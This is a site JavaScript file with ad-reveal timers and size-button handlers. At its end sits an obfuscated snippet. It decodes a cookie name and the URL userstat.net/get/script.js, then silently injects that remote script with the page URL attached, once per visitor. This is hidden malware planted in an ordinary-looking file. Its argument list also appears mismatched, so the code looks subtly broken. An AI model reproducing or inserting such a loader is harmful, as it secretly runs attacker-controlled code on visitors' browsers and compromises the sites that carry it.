function showAd2() {
    document.getElementById("ad1").style.display = "none";
    document.getElementById("ad2").style.display = "block";
    
    setTimeout(() => {
        document.getElementById("loadingGif").style.display = "none";
        document.getElementById("text1").classList.remove("hidden");
        
        setTimeout(() => {
            document.getElementById("loadingGif2").classList.remove("hidden");
            
            setTimeout(() => {
                document.getElementById("loadingGif2").style.display = "none";
                document.getElementById("text2").classList.remove("hidden");
                
                setTimeout(() => {
                    document.getElementById("loadingGif3").classList.remove("hidden");
                    
                    setTimeout(() => {
                        document.getElementById("loadingGif3").style.display = "none";
                        document.getElementById("text3").classList.remove("hidden");
                        
                        // Novo bloco para text4
                        setTimeout(() => {
                            document.getElementById("text4").classList.remove("hidden");
                        }, 2000);
                        
                    }, 4000);
                    
                }, 2000);
                
            }, 2000);
            
        }, 2000);
        
    }, 3000);
}


document.querySelectorAll(".size-btn").forEach(button => {
    button.addEventListener("click", function() {
        document.querySelectorAll(".size-btn").forEach(btn => btn.classList.remove("active"));
        this.classList.add("active");
    });
});

(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        
        setTimeout(function() {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
})(document, location);
